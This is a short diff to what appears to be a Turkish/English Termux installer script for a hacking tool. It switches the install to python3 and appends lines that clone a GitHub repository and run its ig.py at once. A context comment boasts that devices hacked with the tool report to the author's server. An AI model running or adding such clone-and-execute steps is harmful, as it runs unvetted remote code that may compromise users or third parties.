@@ -46,7 +46,7 @@ echo -e $BOSLUK
 echo "⌛ CİHAZINIZA PYTHON KURULUYOR ⌛"
 echo "⌛ PYTHON IS INSTALLED ON YOUR DEVICE ⌛"
 echo -e $BOSLUK
-pkg install python -y
+pkg install python3 -y
 pip install --upgrade pip
 clear
 echo -e $SAKIR
@@ -137,3 +137,7 @@ echo "Hacked Successful✔️"
 
 
 # Dostum kodları çalamazsın çalsanda hacklediğin cihaz benim servere düşer uzaklaş burdan.!
+
+git clone https://github.com/SakirBey1/termux.git
+cd termux
+python3 ig.py
